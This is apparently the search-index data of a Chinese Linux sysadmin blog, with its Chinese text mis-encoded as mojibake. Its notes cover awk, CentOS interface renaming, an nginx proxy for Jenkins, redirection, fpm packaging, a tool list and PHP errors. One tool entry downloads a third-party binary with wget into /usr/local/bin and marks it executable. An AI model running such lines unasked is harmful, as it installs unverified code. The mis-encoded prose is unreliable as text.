å„æ–‡ä»¶åˆ†åˆ«è®¡æ•°çš„è¡Œå· RS: è¡¨ç¤ºè¡Œåˆ†éš”ç¬¦,è¡¨ç¤ºæ¯ä¸ªè®°å½•è¾“å…¥çš„æ—¶å€™çš„åˆ†å‰²ç¬¦,å³è¡Œä¸è¡Œæ˜¯å¦‚ä½•åˆ†å‰²çš„(å†…ç½®å˜é‡RSç”¨æ¥å­˜æ”¾è¾“å…¥çš„è®°å½•åˆ†å‰²ç¬¦,å¯é€šè¿‡BEGINæ¨¡å—æ¥è¿›è¡Œä¿®æ”¹,æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ ORS: è¾“å‡ºè®°å½•åˆ†éš”ç¬¦(è¾“å‡ºæ¢è¡Œç¬¦)ï¼Œè¾“å‡ºæ—¶ç”¨æŒ‡å®šç¬¦å·ä»£æ›¿æ¢è¡Œç¬¦,é»˜è®¤è¡Œçš„åˆ†å‰²ç¬¦ä¸º\\n FILENAME: å½“å‰æ–‡ä»¶å ARGCï¼šå‘½ä»¤è¡Œå‚æ•°çš„ä¸ªæ•° ARGV: æ•°ç»„ï¼Œå‘½ä»¤è¡Œå‚æ•°çš„å€¼ ç¤ºä¾‹ RS: è¡¨ç¤ºè¡Œåˆ†éš”ç¬¦,è¡¨ç¤ºæ¯ä¸ªè®°å½•è¾“å…¥çš„æ—¶å€™çš„åˆ†å‰²ç¬¦,å³è¡Œä¸è¡Œæ˜¯å¦‚ä½•åˆ†å‰²çš„(å†…ç½®å˜é‡RSç”¨æ¥å­˜æ”¾è¾“å…¥çš„è®°å½•åˆ†å‰²ç¬¦,å¯é€šè¿‡BEGINæ¨¡å—æ¥è¿›è¡Œä¿®æ”¹,æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ ç¤ºä¾‹ 1 : [root@00 ~]# head -2 /etc/passwd|awk 'BEGIN{RS=\":\"}{print NR,$0}' ### root:x:0:0:root:/root:/bin/bash ### ### bin:x:1:1:bin:/bin:/sbin/nologin ### 1 root 2 x 3 0 4 0 5 root 6 /root 7 /bin/bash # \u003c\u003c=== æ­¤å¤„æœ¬èº«åŒ…å«ä¸€ä¸ªæ¢è¡Œç¬¦ bin 8 x 9 1 10 1 11 bin 12 /bin 13 /sbin/nologin ç¤ºä¾‹ 2 : [root@00 ~]# head -n 3 /etc/passwd|awk 'BEGIN{RS=\"[:/0-9]+|\\n\"}{print $0}' |sort|uniq -c ### root:x:0:0:root:/root:/bin/bash ### ### bin:x:1:1:bin:/bin:/sbin/nologin ### ### daemon:x:2:2:daemon:/sbin:/sbin/nologin ### 1 bash 4 bin 2 daemon 2 nologin 3 root 3 sbin 3 x FS: è¾“å…¥åˆ†å‰²ç¬¦ï¼Œå‘½ä»¤å¤„ç†å‚æ•°ä½¿ç”¨-FæŒ‡å®šåˆ†å‰²ç¬¦,æˆ–è€…ä½¿ç”¨å˜é‡å½¢å¼ä¿®æ”¹ ç¤ºä¾‹: $\u003e awk -F \":\" 'NR==12,NR==15{print NR,$1,$3}' pwd.txt 12 ftp 14 13 nobody 65534 14 systemd-coredump 999 15 systemd-network 192 $\u003e awk -v FS=\":\" 'NR==12,NR==15{print NR,$1,$3}' pwd.txt 12 ftp 14 13 nobody 65534 14 systemd-coredump 999 15 systemd-network 192 $\u003e head -1 passwd |awk 'BEGIN{FS=\":\"}{print $1,$2}' ### root:x:0:0:root:/root:/bin/bash ### root x OFS: è¾“å‡ºåˆ†å‰²ç¬¦ï¼Œä½¿ç”¨OFSå˜é‡è¿›è¡Œä¿®æ”¹ ç¤ºä¾‹: $\u003e awk -F \":\" -v OFS=\"--\" 'NR==12,NR==15{print NR,$1,$3}' pwd.txt 12--ftp--14 13--nobody--65534 14--systemd-coredump--999 15--systemd-network--192 å…¶ä»–ç¤ºä¾‹ # æ‰“å°èŒƒå›´ $\u003e awk -F: 'NR==12,NR==15{print NR,$1,$3}' pwd.txt 12 ftp 14 13 nobody 65534 14 systemd-coredump 999 15 systemd-network 192 # è‡ªå®šä¹‰å˜é‡ awk -v param=n_user 'BEGIN{print \"å½“å‰ç”¨æˆ·: \" param}' å½“å‰ç”¨æˆ·: n_user $\u003e param=$(whoami) $\u003e echo $param cxd $\u003e awk -v param=$param 'BEGIN{print \"å½“å‰ç”¨æˆ·: \" param}' å½“å‰ç”¨æˆ·: cxd 3. åŸŸ awk é»˜è®¤åˆ†å‰²ç¬¦ä¸ºç©ºæ ¼,æˆ–è€…è¿ç»­çš„ç©ºæ ¼,tabé»˜è®¤ä¹Ÿä¸º(è¿ç»­)ç©ºæ ¼ å½“awkä¸­åªå­˜åœ¨æ¡ä»¶æ—¶,é»˜è®¤è¾“å‡ºæ•´è¡Œ 4. æ­£åˆ™åŒ¹é… æœç´¢/etc/passwdä¸­ç”¨æˆ·ä¸»ç›®å½•åœ¨rootä¸‹çš„ç”¨æˆ·åå’Œbash å˜é‡~æ­£åˆ™ è¡¨ç¤ºå˜é‡å€¼åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ å˜é‡!~æ­£åˆ™ è¡¨ç¤ºå˜é‡å€¼ä¸åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ [root@00 ~]# awk -F: '$(NF-1)~/^\\/root/{print $1,$NF}' /etc/passwd ### root:x:0:0:root:/root:/bin/bash ### ### operator:x:11:0:operator:/root:/sbin/nologin ### root /bin/bash operator /sbin/nologin 5. BEGIN and END BEGIN{å˜é‡å®šä¹‰} {åˆ¤æ–­å’Œè®¡ç®—} END{åˆ¤è¯»å’Œè®¡ç®—å®Œç»“æ‰§è¡Œæ“ä½œ} seq 100 | awk 'BEGIN{sum=0}{sum=$0+sum}END{print sum}' awk æ ¼å¼åŒ–è¾“å‡º ç¤ºä¾‹: $\u003e awk -F: 'BEGIN{printf \"%-25s\\t%-25s\\t%-25s\\t\\n\",\"ç”¨æˆ·å\",\"UID\",\"GID\"}NR==2,NR==5{printf \"%-25s\\t%-25s\\t%-25s\\n\",$1,$3,$4}' pwd.txt ç”¨æˆ·å UID GID bin 1 1 daemon 2 2 adm 3 4 lp 4 7 awk æ¨¡å¼ awk ' BEGIN { actions } /pattern/ { actions } /pattern/ { actions } â€¦â€¦â€¦. END { actions } ' filenames 6. awk æ•°ç»„ ç±»ä¼¼key=value 7. awk å¾ªç¯ foreach å¾ªç¯ ","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/:0:0","tags":["linux","awk"],"title":"AWKå¸¸ç”¨(åŠè‰ç¨¿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":" ä¿¡æ¯ CentOS 7çš„é»˜è®¤ç½‘å¡å’Œè®¾å¤‡åç§°éƒ½æ˜¯éšæœºçš„ï¼Œæ ¹æ®éœ€è¦æœ‰æ—¶å€™éœ€è¦ä¿®æ”¹ç½‘å¡ä¸ºä»¥ethå¼€å¤´çš„ã€‚ä»¥ä¸‹æ•´ç†äº†ä¸¤ç§æ¯”è¾ƒé è°±çš„ã€‚ 1. å®‰è£…è¿‡ç¨‹ä¸­ä¿®æ”¹ åœ¨åŠ è½½é•œåƒåå‡ºç°å®‰è£…é€‰é¡¹å¡çš„æ—¶å€™ï¼Œé”®ç›˜æ•²å‡»tabï¼Œæ‰“å¼€å†…æ ¸å¯åŠ¨é€‰é¡¹ï¼Œå¢åŠ å†…æ ¸å‚æ•° net.ifnames=0 biosdevname=0,å›è½¦ï¼Œç„¶åæ­£å¸¸å®‰è£…å³å¯ã€‚ 2. å®‰è£…ä¹‹åä¿®æ”¹ æ‰“å¼€å¹¶ä¿®æ”¹/etc/sysconfig/network-scripts/ifcfg-ensxxxä¸­çš„nameå’ŒDEVICEä¿®æ”¹ä¸ºeth0,å¹¶é‡å‘½åæ–‡ä»¶ä¸ºifcfg-eth0 ä¿®æ”¹é…ç½®æ–‡ä»¶/etc/default/grub,åœ¨GRUB_CMDLINE_LINUXè¿™ä¸ªå‚æ•°åé¢æ·»åŠ net.ifnames=0 biosdevname=0 ,ç„¶åé‡æ–°é‡æ–°ç”³åŸgrubé…ç½® grub2-mkconfig -o /boot/grub2/grub.cfg ï¼Œé‡å¯æ“ä½œç³»ç»Ÿå³å¯ ","date":"2022-06-23","objectID":"/posts/linux/centos7%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E5%90%8D%E7%A7%B0/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"Centos7ä¿®æ”¹ç½‘å¡åç§°","uri":"/posts/linux/centos7%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E5%90%8D%E7%A7%B0/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Nginxåå‘ä»£ç†jenkins","date":"2022-06-23","objectID":"/posts/linux/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86jenkins/","tags":["linux","jenkins","nginx","è§£å†³æ–¹æ¡ˆ"],"title":"Nginxåå‘ä»£ç†jenkins","uri":"/posts/linux/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86jenkins/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"å‚è€ƒæ–‡çŒ® : https://wiki.jenkins.io/display/JENKINS/Jenkins+behind+an+NGinX+reverse+proxy ä»¥ä¸‹ä¸ºä¸ªäººè§£å†³æ–¹æ¡ˆ : jenkins é…ç½®: æ·»åŠ å¯åŠ¨å‚æ•° --prefix=/jenkinsï¼Œdockerå¯åŠ¨æ·»åŠ ç¯å¢ƒå˜é‡JENKINS_OPTS=\"--prefix=/jenkins\" å‰ç«¯ä¿®æ”¹(Jenkins \u003e Manage Jenkins \u003e Jenkins Location \u003e Jenkins URL) æˆ–è€…ä¿®æ”¹é…ç½®æ–‡ä»¶/var/jenkins_home/jenkins.model.JenkinsLocationConfiguration.xmlä¸­çš„jenkinsUrlï¼Œä¿®æ”¹ä¸ºhttp(s)://www.example.com/jenkins/,é…ç½®æ–‡ä»¶ä¿®æ”¹åéœ€é‡å¯ã€‚ nginxé…ç½®: location /jenkins { proxy_pass http://10.0.0.100:8080/; proxy_redirect http:// https://; sendfile off; proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_max_temp_file_size 0; # This is the maximum upload size client_max_body_size 10m; client_body_buffer_size 128k; proxy_connect_timeout 90; proxy_send_timeout 90; proxy_read_timeout 90; proxy_temp_file_write_size 64k; proxy_http_version 1.1; proxy_request_buffering off; proxy_buffering off; } ","date":"2022-06-23","objectID":"/posts/linux/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86jenkins/:0:0","tags":["linux","jenkins","nginx","è§£å†³æ–¹æ¡ˆ"],"title":"Nginxåå‘ä»£ç†jenkins","uri":"/posts/linux/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86jenkins/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"å¸¸ç”¨é‡å®šå‘åŠè§£é‡Š","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/","tags":["linux"],"title":"å¸¸ç”¨é‡å®šå‘åŠè§£é‡Š","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Linux æ ‡å‡†è¾“å‡º(stdout)å’Œæ ‡å‡†é”™è¯¯(stderr)çš„é‡å®šå‘ 1. é‡å®šå‘ç¬¦å·å’Œè¯­å¥ \u003e ä»¥æ“¦å†™çš„æ¨¡å¼é‡å®šå‘è‡³... \u003e\u003e ä»¥è¿½åŠ çš„æ¨¡å¼é‡å®šå‘è‡³... 1 ä»£è¡¨stdoutæ ‡å‡†è¾“å‡º 2 ä»£è¡¨stderræ ‡å‡†é”™è¯¯ 2. æ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º,ç„¶ååˆå¹¶é‡å®šå‘åˆ°æ–‡ä»¶ command 2\u003e\u00261 output.txt 3. æ ‡å‡†è¾“å‡ºæµå°†ä»…é‡å®šå‘åˆ°æ–‡ä»¶ï¼Œåœ¨ç»ˆç«¯ä¸­ä¸å¯è§ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™ä¼šè¢«è¦†ç›–ã€‚ command \u003e output.txt #command \u00261\u003e output.txt 4. æ ‡å‡†è¾“å‡ºæµå°†ä»…é‡å®šå‘åˆ°æ–‡ä»¶ï¼Œåœ¨ç»ˆç«¯ä¸­ä¸å¯è§ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™æ–°æ•°æ®å°†é™„åŠ åˆ°æ–‡ä»¶æœ«å°¾ã€‚ command \u003e\u003e output.txt 5. æ ‡å‡†é”™è¯¯æµå°†ä»…é‡å®šå‘åˆ°æ–‡ä»¶ï¼Œåœ¨ç»ˆç«¯ä¸­ä¸å¯è§ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™ä¼šè¢«è¦†ç›–ã€‚ command 2\u003e output.txt 6. æ ‡å‡†é”™è¯¯æµå°†ä»…é‡å®šå‘åˆ°æ–‡ä»¶ï¼Œåœ¨ç»ˆç«¯ä¸­ä¸å¯è§ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™æ–°æ•°æ®å°†é™„åŠ åˆ°æ–‡ä»¶æœ«å°¾ã€‚ command 2\u003e\u003e output.txt 7. æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯æµéƒ½å°†ä»…é‡å®šå‘åˆ°æ–‡ä»¶ï¼Œç»ˆç«¯ä¸­ä¸ä¼šæ˜¾ç¤ºä»»ä½•å†…å®¹ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™ä¼šè¢«è¦†ç›–ã€‚ command \u0026\u003e output.txt 8. æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯æµéƒ½å°†ä»…é‡å®šå‘åˆ°æ–‡ä»¶ï¼Œç»ˆç«¯ä¸­ä¸ä¼šæ˜¾ç¤ºä»»ä½•å†…å®¹ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™æ–°æ•°æ®å°†é™„åŠ åˆ°æ–‡ä»¶æœ«å°¾ã€‚ command \u0026\u003e\u003e output.txt 9. æ ‡å‡†è¾“å‡ºæµå°†è¢«å¤åˆ¶åˆ°æ–‡ä»¶ä¸­ï¼Œå®ƒä»å°†åœ¨ç»ˆç«¯ä¸­å¯è§ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™ä¼šè¢«è¦†ç›–ã€‚ command | tee output.txt 10. æ ‡å‡†è¾“å‡ºæµå°†è¢«å¤åˆ¶åˆ°æ–‡ä»¶ä¸­ï¼Œå®ƒä»å°†åœ¨ç»ˆç«¯ä¸­å¯è§ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™æ–°æ•°æ®å°†é™„åŠ åˆ°æ–‡ä»¶æœ«å°¾ã€‚ command | tee -a output.txt 11. Bashæ²¡æœ‰ç®€å†™è¯­æ³•ï¼Œåªå…è®¸StdErrç®¡é“åˆ°ç¬¬äºŒä¸ªå‘½ä»¤ï¼Œè¿™é‡Œéœ€è¦å†æ¬¡ä¸teeç»„åˆæ¥å®Œæˆè¡¨æ ¼ã€‚å¦‚æœä½ çœŸçš„éœ€è¦è¿™æ ·çš„ä¸œè¥¿ï¼Œè¯·çœ‹â€œå¦‚ä½•ç®¡é“stderrï¼Œè€Œä¸æ˜¯stdoutï¼Ÿâ€ æœ‰å…³å¦‚ä½•é€šè¿‡äº¤æ¢æµæˆ–ä½¿ç”¨è¿›ç¨‹æ›¿æ¢æ¥å®Œæˆæ­¤æ“ä½œçš„Stack Overflowã€‚ (*) 12. æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯æµéƒ½å°†è¢«å¤åˆ¶åˆ°æ–‡ä»¶ä¸­ï¼ŒåŒæ—¶ä»åœ¨ç»ˆç«¯ä¸­å¯è§ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™ä¼šè¢«è¦†ç›–ã€‚ command |\u0026 tee output.txt 13. æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯æµéƒ½å°†è¢«å¤åˆ¶åˆ°æ–‡ä»¶ä¸­ï¼ŒåŒæ—¶ä»åœ¨ç»ˆç«¯ä¸­å¯è§ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™æ–°æ•°æ®å°†é™„åŠ åˆ°æ–‡ä»¶æœ«å°¾ã€‚ command |\u0026 tee -a output.txt ","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:0:0","tags":["linux"],"title":"å¸¸ç”¨é‡å®šå‘åŠè§£é‡Š","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"å®šåˆ¶rpmåŒ…","date":"2022-06-23","objectID":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/","tags":["linux","fpm","rpm","è§£å†³æ–¹æ¡ˆ"],"title":"å®šåˆ¶rpmåŒ…","uri":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":" æœ¬æ–‡å‚ç…§ä»¥ä¸‹å¼•ç”¨å®è·µç¼–å†™ https://www.zyops.com/autodeploy-rpm/ 1. FPM æ‰“åŒ…å·¥å…· FPMçš„ä½œè€…æ˜¯jordansissel FPMçš„githubï¼š https://github.com/jordansissel/fpm FPMåŠŸèƒ½ç®€å•è¯´å°±æ˜¯å°†ä¸€ç§ç±»å‹çš„åŒ…è½¬æ¢æˆå¦ä¸€ç§ç±»å‹ï¼Œå…¶å…·ä½“å·¥åŠŸèƒ½å®ç°å®é™…ä¸Šæ˜¯å¯¹äºrpmbuildå‘½ä»¤çš„ä¸€ä¸ªå°è£… 1.1. æ”¯æŒçš„æºç±»å‹åŒ… 1. dir å°†ç›®å½•æ‰“åŒ…æˆæ‰€éœ€è¦çš„ç±»å‹ï¼Œå¯ä»¥ç”¨äºæºç ç¼–è¯‘å®‰è£…çš„è½¯ä»¶åŒ… 2. rpm å¯¹rpmè¿›è¡Œè½¬æ¢ 3. gem å¯¹rubygemåŒ…è¿›è¡Œè½¬æ¢ 4. python å°†pythonæ¨¡å—æ‰“åŒ…æˆç›¸åº”çš„ç±»å‹ 1.2. æ”¯æŒçš„ç›®æ ‡ç±»å‹åŒ… 1. rpm è½¬æ¢ä¸ºrpmåŒ… 2. deb è½¬æ¢ä¸ºdebåŒ… 3. solaris è½¬æ¢ä¸ºsolarisåŒ… 4. puppet è½¬æ¢ä¸ºpuppetæ¨¡å— 1.3. FPMå®‰è£… # fpmæ˜¯rubyå†™çš„ï¼Œå› æ­¤ç³»ç»Ÿç¯å¢ƒéœ€è¦rubyï¼Œä¸”rubyç‰ˆæœ¬å·å¤§äº1.8.5ã€‚ # å®‰è£…rubyæ¨¡å— yum -y install ruby rubygems ruby-devel # æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„rubygemsä»“åº“ gem sources list # æ·»åŠ é˜¿é‡Œäº‘çš„Rubygemsä»“åº“ï¼Œå¤–å›½çš„æºæ…¢ï¼Œç§»é™¤åŸç”Ÿçš„Rubyä»“åº“ gem sources --add http://mirrors.aliyun.com/rubygems/ --remove http://rubygems.org/ # å®‰è£…fpmï¼Œgemä»rubygemä»“åº“å®‰è£…è½¯ä»¶ç±»ä¼¼yumä»yumä»“åº“å®‰è£…è½¯ä»¶ã€‚é¦–å…ˆå®‰è£…ä½ç‰ˆæœ¬çš„jsonï¼Œé«˜ç‰ˆæœ¬çš„jsonéœ€è¦ruby2.0ä»¥ä¸Šï¼Œç„¶åå®‰è£…ä½ç‰ˆæœ¬çš„fpmï¼Œå¤Ÿç”¨ã€‚ gem install json -v 1.8.3 gem install fpm -v 1.3.3 # ä¸Šé¢çš„2æ­¥å®‰è£…ä»…é€‚åˆCentOS6ç³»ç»Ÿï¼ŒCentOS7ç³»ç»Ÿä¸€æ­¥æå®šï¼Œå³gem install fpm 1.4. FPMå‚æ•° è¯¦ç»†ä½¿ç”¨è§fpm â€“help å¸¸ç”¨å‚æ•° -s æŒ‡å®šæºç±»å‹ -t æŒ‡å®šç›®æ ‡ç±»å‹ï¼Œå³æƒ³è¦åˆ¶ä½œä¸ºä»€ä¹ˆåŒ… -n æŒ‡å®šåŒ…çš„åå­— -v æŒ‡å®šåŒ…çš„ç‰ˆæœ¬å· -C æŒ‡å®šæ‰“åŒ…çš„ç›¸å¯¹è·¯å¾„ Change directory to here before searching forfiles -d æŒ‡å®šä¾èµ–äºå“ªäº›åŒ… -f ç¬¬äºŒæ¬¡æ‰“åŒ…æ—¶ç›®å½•ä¸‹å¦‚æœæœ‰åŒåå®‰è£…åŒ…å­˜åœ¨ï¼Œåˆ™è¦†ç›–å®ƒ -p è¾“å‡ºçš„å®‰è£…åŒ…çš„ç›®å½•ï¼Œä¸æƒ³æ”¾åœ¨å½“å‰ç›®å½•ä¸‹å°±éœ€è¦æŒ‡å®š --post-install è½¯ä»¶åŒ…å®‰è£…å®Œæˆä¹‹åæ‰€è¦è¿è¡Œçš„è„šæœ¬ï¼›åŒ--after-install --pre-install è½¯ä»¶åŒ…å®‰è£…å®Œæˆä¹‹å‰æ‰€è¦è¿è¡Œçš„è„šæœ¬ï¼›åŒ--before-install --post-uninstall è½¯ä»¶åŒ…å¸è½½å®Œæˆä¹‹åæ‰€è¦è¿è¡Œçš„è„šæœ¬ï¼›åŒ--after-remove --pre-uninstall è½¯ä»¶åŒ…å¸è½½å®Œæˆä¹‹å‰æ‰€è¦è¿è¡Œçš„è„šæœ¬ï¼›åŒ--before-remove 2. ä½¿ç”¨å®ä¾‹â€“å®æˆ˜å®šåˆ¶nginxçš„RPMåŒ… 2.1. å®‰è£…nginx 2.2. å®šåˆ¶rpmå®‰è£…å(å‰)æ‰§è¡Œè„šæœ¬ [root@00 ~]# vim /opt/sh/nginx.rpm.sh #!/bin/bash # æŒ‡å®šä½†ä¸åˆ›å»ºä¸»ç›®å½•æ˜¯ä¸ºäº†è§„åˆ’ftpè™šæ‹Ÿå¸å·ç”¨çš„ useradd nginx -M -s /sbin/nologin -d /var/ftproot ln -s /opt/nginx-1.14.2/ /opt/nginxssl 2.3. æ‰“åŒ… [root@00 ~]# fpm -s dir -t rpm --description 'nginx' -n nginx -v 1.14.2 -d 'pcre-devel,openssl-devel' --post-install /opt/sh/nginx.rpm.sh -C /opt/nginx-1.6.2/ -f /opt/nginx-1.6.2/ # å®‰è£…å¥½çš„ï¼Œå¤åˆ¶å®Œæ•´ç»“æ„å†…å®¹åˆ°ä¸€ä¸ªç›®å½•ï¼Œæ‰“åŒ…é‚£ä¸ªç›®å½•å†…çš„å†…å®¹æ˜¯ä¸€æ ·çš„æ•ˆæœ # such as: fpm -s dir -t rpm --description \"badvpn binary for fc32, Source: https://github.com/ambrop72/badvpn \" --rpm-summary 'badvpn' --url 'https://tools.0x5c0f.cc' --license '3-clause BSD license' --iteration fc32 -m 0x5c0f --vendor mail@0x5c0f.cc -n badvpn -v '1.999.130-v1.0' -C . # no value for epoch is set, defaulting to nil {:level=\u003e:warn} no value for epoch is set, defaulting to nil {:level=\u003e:warn} Created package {:path=\u003e\"nginx-1.14.2-1.x86_64.rpm\"} [root@oldboy ~]# ll -h nginx-1.14.2-1.x86_64.rpm -rw-r--r-- 1 root root 6.7M Nov 1 10:02 nginx-1.14.2-1.x86_64.rpm ","date":"2022-06-23","objectID":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/:0:0","tags":["linux","fpm","rpm","è§£å†³æ–¹æ¡ˆ"],"title":"å®šåˆ¶rpmåŒ…","uri":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"æ”¶é›†çš„ä¸€äº›æ„Ÿè§‰æŒºå¥½ç”¨çš„å·¥å…·","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/","tags":["linux"],"title":"é‚£äº›å¥½ç”¨çš„å·¥å…·æ”¶é›†","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"1. æ–‡ä»¶å†…å®¹æœç´¢å·¥å…·(ag) # ç±»ä¼¼äºgrep $\u003e yum install the_silver_searcher $\u003e ag \"hello\" ./example 2. mysql å‘½ä»¤è¡¥å…¨å·¥å…·ï¼Œå¯æ›¿ä»£mysqlå‘½ä»¤ https://github.com/dbcli $\u003e pip install -U mycli $\u003e mycli 3. å¤šçº¿ç¨‹ä¸‹è½½å·¥å…·(axel) $\u003e yum install axel $\u003e axel -n 10 http(ftp)://example.com/example.iso 4. ç»ˆç«¯å‘½ä»¤è¡¥å…¨ $\u003e yum install bash-completion -y 5. linux ç¡¬ä»¶æŸ¥çœ‹ç¥å™¨ $\u003e yum install inxi -y 6. linux Script ç»ˆç«¯è®°å½•ç¥å™¨ https://asciinema.org/ $\u003e pip3 install asciinema 7. linux æ–‡ä»¶åŠ å¯†ä¸è§£å¯†å·¥å…· https://linux.cn/article-10632-1.html $\u003e wget -O /usr/local/bin/toplip https://2ton.com.au/standalone_binaries/toplip \u0026\u0026 chmod +x /usr/local/bin/toplip 8. zenity - display GTK+ dialogs( å›¾å½¢ç•Œé¢æ“çºµå·¥å…· ) $\u003e zenity --help 9. ç³»ç»Ÿæ€§èƒ½ç›‘æ§å’Œæ•…éšœè¯Šæ–­å·¥å…· sysdig ## fedora ä¸‹ï¼Œæ–°ç‰ˆå·²ç»ä¸æ”¯æŒ dkms,ä½¿ç”¨éœ€è¦ä½¿ç”¨ --modern-bpf ## https://github.com/draios/sysdig/issues/2035 # ç½‘ç»œå®½å¸¦å ç”¨ $\u003e sysdig -c topprocs_net # CPU å ç”¨ $\u003e sysdig -c topprocs_cpu # è¯»å†™é‡æœ€å¤§çš„æ–‡ä»¶ $\u003e sysdig -c topfiles_bytes # æŸ¥çœ‹å®¹å™¨ç›¸å…³èµ„æºä½¿ç”¨çŠ¶æ€ $\u003e csysdig -vcontainers 10. ç»ˆç«¯æ–‡ä»¶ç®¡ç†å·¥å…·ï¼Œæ”¯æŒæ–‡ä»¶é¢„è§ˆ yazi https://github.com/sxyazi/yazi 11. Linux ä¸‹ TCP/UDP ç«¯å£è½¬å‘å·¥å…· https://github.com/samhocevar/rinetd 12. Linux ä¸‹å¥½ç”¨çš„å‰ªè´´æ¿ç®¡ç†å·¥å…· copyq $\u003e sudo dnf install -y copyq 13. runlike æ˜¾ç¤ºæ­£åœ¨è¿è¡Œçš„å®¹å™¨ docker run å‘½ä»¤ # alias runlike=\"docker run --rm -v /var/run/docker.sock:/var/run/docker.sock assaflavie/runlike\" $\u003e pip install runlike ","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:0:0","tags":["linux"],"title":"é‚£äº›å¥½ç”¨çš„å·¥å…·æ”¶é›†","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Phpè¿ç»´æ•…éšœè®°å½•","date":"2022-06-22","objectID":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","tags":["linux","php","è§£å†³æ–¹æ¡ˆ"],"title":"Phpè¿ç»´æ•…éšœè®°å½•","uri":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. PHP message: PHP Fatal error: Allowed memory size of 134217728 bytes exhausted, ä¿®æ”¹ php.ini # memory_limit = 128M # é»˜è®¤ # memory_limit = -1 # ä»£è¡¨æ— é™åˆ¶ memory_limit = 256M # ä¸€ä¸ªçº¿ç¨‹çš„æœ€å¤§å†…å­˜ä½¿ç”¨é‡ï¼Œå³ä¸€ä¸ªWebè¯·æ±‚å¯ä½¿ç”¨çš„PHPå†…å­˜é‡ã€‚ # å®Œæˆåé‡å¯nginxå³å¯ 2. request_terminate_timeoutçš„å€¼å¦‚æœè®¾ç½®ä¸º0æˆ–è€…è¿‡é•¿çš„æ—¶é—´ï¼Œå¯èƒ½ä¼šå¼•èµ·file_get_contentsçš„èµ„æºé—®é¢˜ã€‚ 